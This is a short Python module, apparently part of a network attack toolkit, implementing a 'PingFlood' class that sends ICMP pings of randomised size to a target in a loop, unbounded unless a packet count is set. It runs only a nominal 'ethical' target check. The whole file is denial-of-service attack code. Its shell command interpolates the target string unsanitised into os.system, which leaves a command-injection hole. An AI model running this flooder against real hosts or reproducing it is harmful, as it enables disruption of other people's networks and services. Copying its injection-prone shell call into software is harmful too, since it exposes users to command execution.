import os
import asyncio
from core.ethical_check import EthicalEnforcer
import random

class PingFlood:
    def __init__(self):
        self.eth = EthicalEnforcer()
        
    async def attack(self, config):
        self.eth.validate_target(config.target)
        packets_sent = 0
        
        while True:
            if config.packets > 0 and packets_sent >= config.packets:
                break
                
            # Use system ping with randomized packet sizes
            packet_size = random.randint(64, 1500)
            os.system(f"ping -c 1 -s {packet_size} {config.target} > /dev/null 2>&1")
            packets_sent += 1
            
            if packets_sent % 100 == 0:
                print(f"Sent {packets_sent} ICMP packets", end='\r')
        
        print(f"\nPing flood completed. Total packets: {packets_sent}")